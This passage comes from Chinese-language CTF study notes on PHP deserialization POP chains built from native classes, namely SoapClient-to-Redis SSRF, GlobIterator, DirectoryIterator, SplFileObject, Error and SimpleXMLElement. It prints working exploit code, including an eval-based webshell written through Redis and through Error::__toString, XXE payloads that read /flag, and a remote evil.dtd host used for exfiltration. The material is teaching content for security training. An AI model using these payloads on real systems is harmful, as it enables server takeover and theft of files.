- **②**：`CONFIG SET dir` 指定 Redis 数据持久化到哪个目录；`CONFIG SET dbfilename` 指定持久化文件名；`SET shell ...` 存入一句话木马作为 Redis 键值；`SAVE` 触发持久化写入磁盘。前导 `\r\n` 确保第一个 Redis 命令出现在新行。
- **③**：`$obj->checker` 被赋值为一个 SoapClient 对象。序列化后，`checker` 属性携带 SoapClient 实例的全部配置（location / uri / user_agent）。
- **④**：反序列化后 `Safer::__destruct()` → `$this->checker->verify()` → SoapClient 没有 `verify()` 方法 → 触发 `__call('verify', [])` → SoapClient 向 `http://127.0.0.1:6379/` 发 POST。只有在上面的旧版 Redis 和文件权限前提全部成立时，注入命令才可能执行并生成 `/var/www/html/shell.php`。

**旧版 Redis 如果仅配置了 `requirepass`：**

在命令序列最前面加上 `AUTH <密码>` 即可，修改第 ② 步：

```php
$redis_cmd = "\r\n" .
    "AUTH mypassword\r\n" .                      // 先认证
    "CONFIG SET dir /var/www/html\r\n" .
    // ... 后续命令不变
```

这仍要求已知密码且服务接受这条跨协议连接。Redis 3.2.7+ 会先因 `POST` / `Host:` 中止连接；现代 Redis 的 ACL、protected mode、受保护配置项和文件权限还会继续限制这条链，不能用"加一条 AUTH"概括。

---

### 1.8.3 GlobIterator —— 目录遍历

**继承链：** GlobIterator → FilesystemIterator → DirectoryIterator → SplFileInfo

**关键方法：**

- `__construct(string $pattern, int $flags = ...)` — 传入 glob 模式（如 `"/var/www/*.php"`），创建时自动执行匹配
- `__toString(): string` — 继承自 `DirectoryIterator`，返回当前条目的文件名
- `getFilename(): string` — 返回文件名
- `getPathname(): string` — 返回当前条目的完整路径

`GlobIterator` 本身没有直接定义 `__toString()`，继承的是 `DirectoryIterator::__toString()`，结果是当前条目的**文件名**。需要完整路径时显式调用 `getPathname()`。`foreach` 默认得到的当前值通常是 `SplFileInfo`，但也会受 `FilesystemIterator` 的 `CURRENT_*` 标志影响，因此笔记示例不依赖隐式字符串转换。

**正常使用（理解类自身行为）：**

```php
$g = new GlobIterator("/var/www/html/*.php");  // 构造时执行 glob，匹配所有 .php 文件
foreach ($g as $file) {
    echo $file->getPathname() . "\n";  // 显式输出完整路径
}
// 输出示例：
// /var/www/html/index.php
// /var/www/html/config.php
```

**glob 模式语法（常用）：**

| 模式 | 含义 | 示例 |
|---|---|---|
| `*` | 匹配任意字符（不含 `/`） | `/var/www/*.php` → `index.php`, `config.php` |
| `?` | 匹配单个字符 | `/???` → `/tmp`, `/var` |
| `[abc]` | 匹配字符集中的一个 | `/flag[0-9]` → `/flag1`, `/flag2` |
| 多层 `*` | 按已知层数匹配子目录 | `/var/*/*.php` |

PHP 的 `glob()` / `GlobIterator` 没有可移植的"`**` 递归任意层"语义，`GLOB_BRACE` 控制的是 `{a,b}` 备选项而不是递归。未知深度应使用 `RecursiveDirectoryIterator`，或逐层调整模式。

> **注意：`GlobIterator` 不能像 `DirectoryIterator` 那样直接传目录来列出内容。** `GlobIterator` 内部调用 PHP 的 `glob()` 函数，规则和 Shell 一致——不加通配符只检查路径本身是否存在，不展开成目录内容：
> ```php
> new GlobIterator("/var/www/html/");   // 输出 "/var/www/html/"，不列出目录下的文件
> new GlobIterator("/var/www/html/*");  // 列出目录下所有文件
> ```
> 想列出目录内容，路径末尾必须带 `/*`。

---

**例题：利用 GlobIterator 探知目录**

**题目源码：**

```php
<?php
class Logger {
    public $pattern;
    public function __destruct() {
        $it = new GlobIterator($this->pattern);
        if ($it->valid()) {
            echo "日志路径：" . $it->getPathname();
        }
    }
}
class Scanner {
    public $pattern;
    public function __destruct() {
        foreach (new GlobIterator($this->pattern) as $item) {
            echo $item->getPathname() . "\n";
        }
    }
}
highlight_file(__FILE__);
$data = unserialize($_GET['data']);
```

**目标：** flag 文件藏在 `/var/www/html/` 下某个未知名字的子目录里，需要先探测目录结构，再读文件。

---
`GlobIterator` 不能直接序列化，因此利用点必须是题目代码会用可控字符串构造迭代器。本例只把 glob 模式放进 payload。

**第一步 — 让目标代码构造迭代器并探测第一个结果：**

```php
$log = new Logger();
// glob 模式 /var/www/html/* 匹配 web 根目录下的所有文件和目录
$log->pattern = "/var/www/html/*";
echo urlencode(serialize($log));
```

**执行过程：**

1. 反序列化完成 → 对象销毁 → `Logger::__destruct()` 自动触发
2. 目标代码用 `$this->pattern` 构造 `GlobIterator`
3. `valid()` 确认存在匹配项，`getPathname()` 返回当前条目的完整路径
4. 由于没有循环推进迭代器，只返回 **glob 匹配到的第一个条目**

输出类似 `日志路径：/var/www/html/admin/`，得知存在 `admin` 子目录。

**关键限制：** 这里的目标代码只读取一次当前项，所以只能获取**第一个**匹配结果。要列出所有文件，需要目标代码用循环驱动迭代器前进。

---

**第二步 — 用 `foreach` 遍历所有文件：**

```php
$scan = new Scanner();
// 改用更精确的 glob：探测 admin 目录下的所有文件
$scan->pattern = "/var/www/html/admin/*";
echo urlencode(serialize($scan));
```

**执行过程：**

1. `Scanner::__destruct()` 用可控模式构造 `GlobIterator`，再进入 `foreach`
2. foreach 自动调用 Iterator 接口方法：`rewind()` → `valid()` → `current()` → `next()` → ...
3. 每次循环显式调用 `$item->getPathname()`，输出当前文件的完整路径
4. 循环结束后，`admin/` 下所有条目全部输出

输出示例：

```
/var/www/html/admin/header.php
/var/www/html/admin/fl4g_s3cr3t.txt
/var/www/html/admin/logout.php
```

---

**第三步 — 读取发现的 flag 文件：**

已知路径 `/var/www/html/admin/fl4g_s3cr3t.txt`，换用 `SplFileObject` 读取（见下一节 16.8.4）。

---

**总结：**

| 触发方式 | 能获取的数量 | 适用场景 |
|---|---|---|
| 单次 `getPathname()` | 1 个（第一个匹配） | 快速探测目录是否存在、文件是否存在 |
| `foreach` → Iterator 接口 | 全部 | 列出目录下所有条目 |

`GlobIterator` 的优势是支持通配符，不需要知道精确文件名就能定位目标。

**另一个关键优势——回显长度受限时：** 如果题目输出有长度限制（或页面大小有限），`DirectoryIterator` 遍历 `/var/www/html/` 可能输出几百个文件，flag 没出来就被截断了。`GlobIterator` 可以直接 `"/f*"`，精准过滤，回显只有寥寥几行，flag 直接命中。

如果题目过滤了 `*` 等通配符，可换用 `DirectoryIterator`（见 16.8.5），它接受纯目录路径。

**为什么没有循环就拿不到第二个文件：**

GlobIterator 内部有一个"光标"（指针），指向当前迭代到哪个条目：

```
构造后 → 光标指向位置 0（第一个条目）
getPathname() → 返回位置 0，光标不动
再次调用      → 还是位置 0，内容不变
```

只有 `foreach`（或手动调用 `$obj->next()`）才能让光标前进。但反序列化 POP 链中只有魔术方法（`__destruct`、`__wakeup`、`__toString` 等）被自动触发，没人帮你逐次调 `next()`。因此：

- 题目源码有 `foreach` → 能遍历全部文件
- 题目源码只读取一次当前项 → 只能拿到第一个匹配文件名

如果目标代码只读取一次当前项，靠多发 payload 用不同 glob 模式逼近后面的文件名理论上可行，但通常不实用；更合理的是寻找能遍历迭代器的目标代码，或换其他已有利用点。

---

### 1.8.4 SplFileObject —— 文件读取

**继承链：** SplFileObject → SplFileInfo

**关键方法：**

- `__construct(string $filename, string $mode = "r", ...)` — 传入文件路径，打开文件准备读
- `fgets(): string` — 读取一行，类似 `fgets()`
- `current(): string|array` — 返回当前行内容（实现 Iterator 接口，foreach 遍历时每次 yield 一行）
- `key(): int`、`next(): void`、`valid(): bool`、`rewind(): void` — Iterator 接口方法，由 foreach 自动调用
- `__toString(): string` — `SplFileObject` 自己实现该方法，返回**当前行**，不是文件路径；不同 PHP 小版本中它曾分别作为 `fgets()` / `current()` 的别名，光标副作用有差异

`SplFileObject` 把文件操作包装成了对象——构造时传入路径，自动打开文件。在 POP 链中，最常见的是利用 `foreach` 驱动 Iterator 接口逐行读出文件内容。

> **注意：`SplFileObject::__toString()` 返回当前行，不是路径！**
> ```php
> $f = new SplFileObject("/flag");
> echo $f;  // 输出当前行；初始位置通常是第一行
> ```
> **`echo` 和 `foreach` 的区别：**
>
> 两者触发的是不同方法，和循环本身无关：
> ```
> echo $obj      → 把对象当字符串 → 调用 __toString() → 返回当前行
> foreach ($obj) → 把对象当迭代器 → 调用 current()   → 返回当前行内容
> ```
> `echo` 适合取当前一行，`foreach` 适合遍历多行；若链路需要明确推进光标，可以调用 `fgets()` / `next()`，并按目标 PHP 小版本验证行为。

---

**例题：利用 SplFileObject 读取 flag**

**题目源码（接 GlobIterator 例题的场景——路径已探知）：**

```php
<?php
class LogViewer {
    public $filename;
    public function __destruct() {
        // 管理员查看系统日志，逐行展示
        $source = new SplFileObject($this->filename, "r");
        echo "<pre>";
        foreach ($source as $idx => $msg) {
            echo "[{$idx}] {$msg}";
        }
        echo "</pre>";
    }
}
highlight_file(__FILE__);
$data = unserialize($_GET['data']);
```

**目标：** 已知 flag 路径为 `/flag`，读其内容。

这个 `LogViewer` 类原本是后台查看系统日志用的，但反序列化数据可以覆盖 `$filename`，目标代码又用它构造 `SplFileObject` 并逐行输出，于是形成任意文件读取。`SplFileObject` 本身不支持序列化，不能把 `new SplFileObject("/flag")` 直接嵌入 payload。

**`SplFileObject` 不能用来探知路径：** 它的构造函数要求传入**精确的文件路径**，不支持通配符——文件不存在直接报错。所以它只能"读"，不能"找"。路径未知时，必须先用 `GlobIterator`（支持 `*`、`?` 通配符）探知文件位置，再用 `SplFileObject` 读取内容。

| | GlobIterator | SplFileObject |
|---|---|---|
| 构造参数 | glob 模式（`/var/www/*.php`） | 精确文件路径（`/flag`） |
| 作用 | 找文件在哪 | 读文件内容 |
| 通配符 | 支持 `*` `?` `[abc]` | 不支持 |

---
**Exp（逐行解释）：**

```php
class LogViewer {
    public $filename;
}

$lv = new LogViewer();
// payload 中只放可序列化的路径字符串；目标代码负责构造 SplFileObject
$lv->filename = "/flag";

$payload = serialize($lv);
echo urlencode($payload);
```

**执行过程：**

1. 反序列化 → `LogViewer::$filename` 被覆盖为 `/flag`
2. 对象销毁 → `LogViewer::__destruct()` 触发
3. 目标代码执行 `new SplFileObject($this->filename, "r")` 打开 `/flag`，随后进入 `foreach`：
   - PHP 调用 `rewind()` → 光标移到第一行
   - 循环：`valid()` 检查 → `current()` 取当前行 → `echo "[{$idx}] {$msg}"` 输出 → `next()` 前进
4. 循环结束，flag 全部内容被逐行输出

---
**另一种触发方式：用 `fgets()` 读一行**

如果题目源码没有 `foreach`，但会用可控路径构造 `SplFileObject` 后调用 `fgets()`，也可以只读一行：

```php
class SingleReader {
    public $filename;
    public function __toString() {
        $file = new SplFileObject($this->filename, "r");
        return $file->fgets();  // 返回第一行内容
    }
}

$sr = new SingleReader();
$sr->filename = "/flag";
// 当 SingleReader 被 echo/字符串拼接触发 __toString() 时，返回 /flag 的第一行
```

**限制：** `fgets()` 每次读取一行并推进文件指针，下一次调用通常读取下一行。若利用链只触发一次，它只适合单行 flag；多行内容需要循环或 `foreach`。

---

**总结：**

| 触发方式 | 读取量 | 适用场景 |
|---|---|---|
| `foreach ($file as $line)` | 全部行 | flag 多行，需完整读出 |
| `$file->fgets()` | 单行 | flag 仅一行，或被封装在 `__toString()`/`__call()` 链路中触发 |
| `echo $file` → `__toString()` | 当前行 | 单次字符串转换读取一行；指针行为要按 PHP 小版本验证 |

与 `GlobIterator` 的配合关系：`GlobIterator` 负责"找到文件在哪"，`SplFileObject` 负责"把文件读出来"——两者在完整的 POP 利用链中通常是前后步骤。

---

### 1.8.5 DirectoryIterator —— 目录遍历

**继承链：** DirectoryIterator → SplFileInfo

**关键方法：**

- `__construct(string $directory)` — 传入目录路径（不支持 glob 通配符）
- `current(): SplFileInfo` — 返回当前条目（实现 Iterator 接口，foreach 遍历时每次 yield 一个条目）
- `key(): int`、`next(): void`、`valid(): bool`、`rewind(): void` — Iterator 接口方法，由 foreach 自动调用
- `__toString(): string` — `DirectoryIterator` 自己实现，返回当前条目的文件名
- `getFilename(): string` — 同 `__toString()`
- `isDot(): bool` — 当前条目是否为 `.` 或 `..`

**与 `GlobIterator` 的区别：**

| | `DirectoryIterator` | `GlobIterator` |
|---|---|---|
| 构造参数 | 目录路径（纯字符串） | glob 模式（支持 `*`、`?` 等） |
| 遍历范围 | 目录下的**所有条目**（含 `.`、`..`） | 仅匹配 glob 模式的条目 |
| `__toString()` | `DirectoryIterator::__toString()`，返回文件名 | 继承该实现，同样返回文件名 |
| 使用限制 | 无 | 需要 glob 通配符可用 |

**正常使用（理解类自身行为）：**

```php
$d = new DirectoryIterator("/var/www/html/");
foreach ($d as $item) {
    if (!$item->isDot()) {          // 跳过 . 和 ..
        echo $item . "\n";           // 触发 __toString() → 输出文件名
    }
}
// 输出示例：
// index.php
// config.php
// uploads
```

---

**与 `GlobIterator` 的详细对比：**

| | DirectoryIterator | GlobIterator |
|---|---|---|
| 构造参数 | 纯目录路径（`/var/www/`） | glob 模式（`/var/www/*.php`） |
| 依赖通配符 | 不需要 | 依赖 `*` `?` `[abc]` |
| 遍历范围 | 目录下**全部条目**（含 `.`、`..`） | 仅匹配 glob 模式的条目 |
| 过滤能力 | 无，必须手动在循环体内 `if` 判断 | 天然过滤，构造时就限定范围 |

**利与弊：**

**DirectoryIterator 的优势：**
- **不依赖通配符** — `*`、`?` 被 WAF 过滤时仍然可用
- **参数干净** — 纯路径字符串，没有特殊字符，不会触发任何安全规则
- **不会遗漏** — 列出目录下所有文件，不会因为 glob 写法不对而漏掉目标

**DirectoryIterator 的劣势：** 无法筛选——连 `.`、`..` 一起列出，目录下有很多文件时会造成不便。

---

**例题：利用 DirectoryIterator 列出目录文件**

**题目源码：**

```php
<?php
class BackupScanner {
    public $folder;
    public function __destruct() {
        echo "备份目录扫描结果：\n";
        foreach (new DirectoryIterator($this->folder) as $item) {
            if (!$item->isDot()) {
                echo $item . "\n";
            }
        }
    }
}
highlight_file(__FILE__);
$data = unserialize($_GET['data']);
```

**Exp：**

```php
class BackupScanner {
    public $folder;
}

$bs = new BackupScanner();
// payload 中只放目录字符串；目标代码负责构造 DirectoryIterator
$bs->folder = "/var/www/html/";

echo urlencode(serialize($bs));
```

输出会把 `/var/www/html/` 下所有文件名和子目录名全部打印出来——不需要知道文件名，也不需要通配符。

---

**逐行解读 foreach 循环：**

1. 反序列化只恢复目录字符串；`new DirectoryIterator($this->folder)` 由目标代码执行。该对象实现 Iterator 接口，foreach 自动驱动：`rewind()` → 光标移到第一个条目 → 循环：`valid()` 检查是否还有条目 → `current()` 取当前条目赋给 `$item` → 执行循环体 → `next()` 光标前进
2. `$item` — 每次循环是一个 `SplFileInfo` 对象，代表当前目录条目（可能是文件、子目录、`.` 或 `..`）
3. `$item->isDot()` — 检查当前条目是否为 `.`（当前目录自身）或 `..`（上级目录）。它们每个目录都有，属于噪音，跳过即可
4. `echo $item` — `$item` 是对象，被 `echo` 时触发 `DirectoryIterator::__toString()`，返回当前条目的文件名（如 `"index.php"`），不是完整路径
5. 循环继续 → `next()` → `valid()` → `current()` → ... → 直到 `valid()` 返回 false，循环结束

`DirectoryIterator` 本身也不能直接序列化。利用前提仍是目标代码会用反序列化出的可控目录字符串构造它。光标行为和 GlobIterator 相似：只读取一次当前项通常只能看到第一个条目（常为 `.`），`foreach` 才能遍历全部。

---

### 1.8.6 Error / Exception —— POP 链的万能胶水

**关键方法：**

Error（PHP 7.0+）和 Exception 都实现了 Throwable 接口，字符串化思路相近但类名、继承关系和版本范围不同。以下以 Error 为例；还要确认目标版本允许该内部对象按预期序列化和恢复。

- `__construct(string $message = "", int $code = 0, ?Throwable $previous = null)` — $message 为错误消息，$code 为错误码
- `__toString(): string` — 返回格式化的错误字符串

**正常使用（理解类自身行为）：**

```php
$e = new Error("something went wrong");
echo $e;
// 输出：
// Error: something went wrong in /var/www/html/index.php:0
// Stack trace:
// #0 {main}
```

`__toString()` 的返回值由三部分组成——只有 `$message` 受你控制，其余是自动生成的：

```text
Error: <$message> in <当前文件>:<行号>
Stack trace:
#0 {main}
```

写入 `.php` 文件后，只要 `$message` 本身是一段完整有效的 PHP 代码（`<?php ... ?>`），它就嵌在这个文本里，PHP 解析该文件时仍会执行它——前后的 `Error: ` 和堆栈信息只是纯文本，不影响 PHP 解析。

---

**与其他原生类 `__toString()` 的对比：**

同一个 `echo $obj`，不同原生类返回的内容完全不同：

| 原生类 | `__toString()` 返回内容 | 是否受控 |
|---|---|---|
| GlobIterator | 当前条目的文件名 | 否——由文件系统决定 |
| SplFileObject | 文件当前行 | 否——由文件内容和当前指针决定 |
| DirectoryIterator | 当前条目的文件名 | 否——由文件系统决定 |
| **Error** | 构造时传入的 `$message` | **是——完全由你决定** |

在这组常见示例中，`Error` 的优势是构造时可控的 `$message` 会进入字符串结果；不能据此断言它是 PHP 中"唯一"一个可控字符串化的原生类，是否可用还要看 PHP 版本、序列化行为和题目限制。

因此它常被当作"胶水"对象：既能通过一般的 `is_object()` 检查，又能在字符串转换位置带出可控 message。不过 `instanceof` 只会在检查目标类型匹配时通过，`Error::__toString()` 的格式也包含错误位置和堆栈，不能写成任何检查下都"永远可用"。

---

**例题：利用 Error 写马**

**题目源码：**

```php
<?php
class CacheWriter {
    public $entry;
    public function __destruct() {
        // 对象类型的缓存条目 → 导出为静态文件，减少后续数据库查询
        if (is_object($this->entry)) {
            file_put_contents("/var/www/html/cache/page.php", $this->entry);  // ① __toString()
        }
    }
}
highlight_file(__FILE__);
$data = unserialize($_GET['data']);
```

**目标：** 写入一句话木马，获取服务器权限。

代码里没有任何 `getMessage()`、`Exception`、`Error` 字样——就是一个普通的缓存写入类。入口被 `is_object()` 把着：传字符串直接跳过，传对象才进分支。

---

**Exp（逐行解释）：**

```php
class CacheWriter {
    public $entry;
}

$cw = new CacheWriter();
// ① $message 填一句话木马
// ② Error 是对象 → is_object() 返回 true → 进入分支
// ③ file_put_contents 收到 Error 对象 → PHP 调 __toString() → 写入文件
$cw->entry = new Error('<?php eval($_POST[1]);?>');

echo urlencode(serialize($cw));
```

---

**执行过程：**

1. 反序列化 → `CacheWriter::__destruct()` 触发
2. `is_object($this->entry)` → Error 是对象 → `true` → 进入分支
3. `file_put_contents("/var/www/html/cache/page.php", $this->entry)` → 第二个参数是 Error **对象**，PHP 自动调 `__toString()` 转型后写入：

```text
Error: <?php eval($_POST[1]);?> in /var/www/html/index.php:0
Stack trace:
#0 {main}
```

4. 访问 `/cache/page.php`，POST `1=system('cat /flag');` → flag 到手

---

**为什么不能用字符串？**

```php
$cw->entry = "<?php eval(\$_POST[1]);?>";
// is_object("string") → false → 跳过 if 分支 → file_put_contents 根本没执行
// 页面无任何反应，webshell 写不进去
```

它不会报错——静默失败。你发完 payload 一看，`/cache/page.php` 不存在。

**为什么不能用其他原生类？**

从运行时类型看，GlobIterator、SplFileObject 也能通过 `is_object()`；但它们不能直接序列化进这个 payload。即使目标代码另有路径能构造它们，其字符串结果也不适合写入可控 WebShell：

```php
// 正常运行时：GlobIterator → __toString() 返回当前条目的文件名
$g = new GlobIterator("/var/www/*");
echo $g;
// 输出类似 "index.php"，不是 webshell；而且 $g 不能直接 serialize()

// 正常运行时：SplFileObject → __toString() 返回当前行
$f = new SplFileObject("/flag");
echo $f;
// 输出 flag 文件当前行，内容不由攻击者自由指定；$f 也不能直接 serialize()
```

这些对象在正常运行时都满足 `is_object()`，但 `__toString()` 产出的内容不由你自由控制：GlobIterator / DirectoryIterator 给出当前文件名，SplFileObject 给出当前行，均不能直接替代任意 WebShell 字符串；同时还必须先解决"由目标代码构造对象"的前提。

---

### 1.8.7 SimpleXMLElement —— XXE

**关键方法：**

- `__construct(string $data, int $options = 0, bool $dataIsURL = false, ...)` — 构造函数，$data 为 XML 字符串，$options 为 libxml 选项标志位（位掩码），$dataIsURL 为 `true` 时 $data 被当作文件路径/URL
- `__toString(): string` — 返回当前元素**直接包含的文本内容**，不返回整份 XML，也不包含子元素内部文本
- `asXML(string $filename = null): string|bool` — 不传参数时返回格式完整的 XML；传文件路径则将 XML 写入文件

SimpleXMLElement 把一段 XML 字符串解析成一个可以操作的对象——你可以用 `$xml->root` 的方式访问元素。CTF 关心的不是对象操作，而是**构造时解析 XML 的过程**：传入 XXE payload + `LIBXML_NOENT`，解析时自动读取外部实体指向的文件。

---

**正常使用（理解类自身行为）：**

同一段 XML，第二个参数传 `0` 还是 `2`：

```php
$xml = '<?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///flag">]>
        <root>&xxe;</root>';

$default = new SimpleXMLElement($xml, 0);
echo $default;          // 通常为空；__toString() 不返回 XML 标记
echo $default->asXML(); // 可看到未替换的 &xxe; 仍在 XML 结构中

$expanded = new SimpleXMLElement($xml, LIBXML_NOENT);
echo $expanded;         // flag{content_here}；只输出 root 的直接文本
```

| options | `&xxe;` 的处理 | 文件读取 |
|---|---|---|
| `0`（默认） | 实体引用保留在 XML 树中，字符串化通常得不到其内容 | 默认不读取该外部实体 |
| `2`（`LIBXML_NOENT`） | 替换为实体内容 | 外部加载器允许时触发 |

`LIBXML_NOENT` 是 PHP 内置常量，值为 `2`，对应 libxml2 的实体替换选项；`LIBXML_DTDLOAD` 的值为 `4`，请求加载外部 DTD。标志位可以用 `|` 组合，例如 `LIBXML_NOENT | LIBXML_DTDLOAD` = `6`。读取内部 DTD 声明的外部实体时常见的是 `LIBXML_NOENT`；加载远程外部 DTD 的 OOB 场景通常还要考虑 `LIBXML_DTDLOAD`。最终是否发起访问仍受 libxml2 版本、实体加载器、`LIBXML_NONET` 和网络策略影响。

libxml 默认不替换实体引用；`LIBXML_NOENT` 会开启替换，但是否能读取外部 URI 还受 libxml2 版本、实体加载器、`LIBXML_NONET` 和运行环境影响。审计源码时看到第二个参数为 `2` / `LIBXML_NOENT` 应重点检查，不能仅凭这一点断言一定可利用。

> **版本注意：** `libxml_disable_entity_loader()` 在 PHP 8.0 起已弃用，因为现代 libxml2 默认不做危险的外部实体替换；但显式传入 `LIBXML_NOENT` / `LIBXML_DTDLOAD` 仍可能重新打开攻击面。应以解析选项和实际 libxml2 行为为准。

---
**构造函数：**

```php
new SimpleXMLElement(string $data, int $options = 0, bool $dataIsURL = false);
```

| 参数 | 作用 | POP 链 |
|---|---|---|
| `$data` | XML 字符串 | 把 XXE payload 写进题目类的属性，反序列化后传进来 |
| `$options` | libxml 标志位 | 写 `2` 还是 `0`，直接决定能不能打 |
| `$dataIsURL` | `true` 时 `$data` 被当作文件路径 | 用不到 |

---
**与普通 XXE 的关系：**

普通 XXE：你 POST 一段 XML → 服务端 `simplexml_load_string($xml, null, LIBXML_NOENT)` → XXE。

POP 链 XXE：你把 XML 写进反序列化 payload 的属性里 → `__wakeup()` / `__destruct()` 里有 `new SimpleXMLElement($this->feedxml, LIBXML_NOENT)` → XXE。

本质是同一个漏洞，只是 XML 的**来源**不同。普通 XXE 来自 HTTP body，POP 链 XXE 来自反序列化数据。利用依赖 libxml 的 DTD/实体加载与替换行为；`LIBXML_NOENT` 是常见危险标志，但外部 DTD 场景还可能需要 `LIBXML_DTDLOAD`，具体取决于解析路径。

---
**例题：利用 SimpleXMLElement 实现 XXE 读 flag**

**题目源码：**

```php
<?php
class FeedImporter {
    public $feedxml;
    public $feedname;
    public function __wakeup() {
        // 导入 RSS 订阅源，解析 XML 并展示标题
        $xml = new SimpleXMLElement($this->feedxml, LIBXML_NOENT);
        echo "订阅源 [{$this->feedname}] 已导入：\n";
        echo $xml;  // 输出根元素的直接文本内容，不输出整份 XML
    }
}
highlight_file(__FILE__);
$data = unserialize($_GET['data']);
```

**目标：** 读取 `/flag` 文件内容。

---
**Exp（逐行解释）：**

```php
class FeedImporter {
    public $feedxml;
    public $feedname;
}

$fi = new FeedImporter();
// ① feedname 随便填，不影响 XXE
$fi->feedname = "test_feed";

// ② feedxml 填入 XXE payload——完整的 XML 文档，声明外部实体并引用
$fi->feedxml = '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///flag">]>
<root>&xxe;</root>';

echo urlencode(serialize($fi));
```

---
**执行过程：**

1. 反序列化完成 → `FeedImporter::__wakeup()` 自动触发
2. `new SimpleXMLElement($this->feedxml, LIBXML_NOENT)` — 第一个参数是我们控制的 XXE payload，第二个参数 `LIBXML_NOENT`（值为 `2`）→ libxml 开启实体替换
3. libxml 解析 XML — 读到 `<!ENTITY xxe SYSTEM "file:///flag">` → 打开 `/flag` 读取内容 → 赋给实体 `xxe`
4. 继续解析 — 读到 `<root>&xxe;</root>` → `&xxe;` 已指向 flag 内容 → 替换
5. `echo $xml` — 调用 `SimpleXMLElement::__toString()`，输出根元素的直接文本，因此这里直接输出 flag 内容，不包含 `<root>` 标签

**页面输出：**

```
订阅源 [test_feed] 已导入：
flag{SimpleXMLElement_XXE_in_POP}
```

---
**Payload 结构逐行拆解：**

```xml
<?xml version="1.0"?>                              <!-- ① XML 声明 — 可选；若存在必须位于开头 -->
<!DOCTYPE root [                                    <!-- ② DTD 声明 — 与根元素名保持一致 -->
  <!ENTITY xxe SYSTEM "file:///flag">               <!-- ③ 实体声明 — 核心！定义外部实体 -->
]>
<root>&xxe;</root>                                  <!-- ④ 正文 + 实体引用 — 解析后被替换 -->
```

1. **`<?xml version="1.0"?>`** — XML 声明是可选的；如果写出，必须位于文档开头，并与实际字节编码一致
2. **`<!DOCTYPE root [...]>`** — DTD（文档类型定义）。名称应与文档根元素 `root` 对应，`[...]` 是声明实体的内部子集
3. **`<!ENTITY xxe SYSTEM "file:///flag">`** — 这是整条 XXE 的核心：
   - `<!ENTITY xxe ...>` — 声明一个名为 `xxe` 的实体
   - `SYSTEM` — 关键词，表示此实体的内容来自**外部资源**（区别于 `<!ENTITY xxe "value">` 的内部实体）
   - `"file:///flag"` — 外部资源的 URI。`file://` 协议告诉 libxml 去读本地文件 `/flag`
   - libxml 解析到这一行 → 打开 `/flag` → 读内容 → 存到实体 `xxe`
4. **`<root>&xxe;</root>`** — XML 正文。`&xxe;` 是实体引用，解析时被替换为步骤 3 读取到的文件内容。于是 `<root>flag{...}</root>`

---
**支持的其他协议：**

| 协议 | 示例 | 说明 |
|---|---|---|
| `file://` | `file:///flag` | 读本地文件，最常用 |
| `http://` | `http://VPS/evil.dtd` | 加载远程 DTD，用于外带数据或绕过文件不存在报错 |
| `php://` | `php://filter/convert.base64-encode/resource=/flag` | 配合 PHP 伪协议，base64 编码后外带（需 PHP 环境支持） |

---
**关键限制（再次强调）：** `SimpleXMLElement` 自身不能直接序列化进 payload 来凭空触发解析。题目代码必须在魔术方法或后续逻辑中，把攻击者可控字符串交给 `new SimpleXMLElement()` / `simplexml_load_string()` 等解析入口，并启用足以加载、替换外部实体的选项；不要求源码字面量恰好是第二个参数 `2`。
